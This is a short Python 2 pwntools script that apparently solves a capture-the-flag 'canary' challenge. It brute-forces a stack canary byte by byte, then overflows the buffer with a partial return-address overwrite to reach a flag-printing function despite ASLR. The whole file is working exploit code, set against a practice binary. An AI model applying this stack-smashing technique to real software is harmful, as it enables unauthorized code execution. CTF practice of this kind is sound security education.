from pwn import *
LEN_CANARY = 4
canary = ""
context.log_level = 'error'
b = '/problems/canary_5_f37171114d0d9fc71194842bb8b7bb34/vuln'

# Brute canary
while len(canary) < LEN_CANARY:
    for i in [chr(x) for x in range(0x100)]:
        r = process(b)
        p = 'A'*0x20
        p += canary
        p += i

        length = len(p)
        r.recvuntil('> ')
        r.sendline(str(length))
        r.recvuntil('> ')
        r.send(p)
        t = r.recvline()

        r.close()
        if('Ok...' in t):
            print canary
            canary += i
            break

# Brute display_flag function address (we know last 3 nible of the address)
FLAG = ''
while FLAG == '':
    r = process(b)
    p = 'A'*0x20 + canary
    p += 'A'*(0x30-len(p))+'BBBB' # BBBB -> ebp
    p += '\xed\x97' # ASLR -> guessing
    r.recvuntil('> ')
    r.sendline(str(len(p)))
    r.recvuntil('> ')
    r.send(p)
    r.recvline()
    try:
        FLAG = r.recvline()
    except:
        pass

print FLAG